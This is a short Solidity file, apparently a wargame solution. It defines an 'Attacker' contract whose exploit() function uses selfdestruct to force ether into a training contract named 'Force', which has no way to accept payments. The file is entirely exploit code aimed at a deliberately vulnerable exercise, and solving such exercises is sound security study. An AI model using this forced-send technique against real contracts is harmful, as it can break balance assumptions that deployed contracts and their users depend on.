// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level07.sol";

contract Attacker
{
    Force level07;
    constructor(address payable _level07)
    {
        level07 = Force(_level07);
    }

    function exploit() external 
    {
        selfdestruct(payable(address(level07)));
    }

    receive() external payable { }
}